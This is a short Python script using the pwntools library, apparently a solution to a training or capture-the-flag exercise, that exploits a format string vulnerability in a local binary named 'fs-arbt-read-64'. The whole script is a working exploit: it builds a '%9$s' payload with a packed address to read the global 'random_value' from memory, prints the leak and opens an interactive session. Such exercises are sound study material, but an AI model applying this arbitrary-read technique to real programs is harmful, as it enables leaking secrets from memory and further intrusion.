#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-read-64")

print(p.recv())

addr_global_var = p.elf.symbols["random_value"]

print(hex(addr_global_var))

buf = "%9$sAAAA" + p64(addr_global_var)


p.sendline(buf)

rec = p.recv()
print(repr(rec))





p.interactive()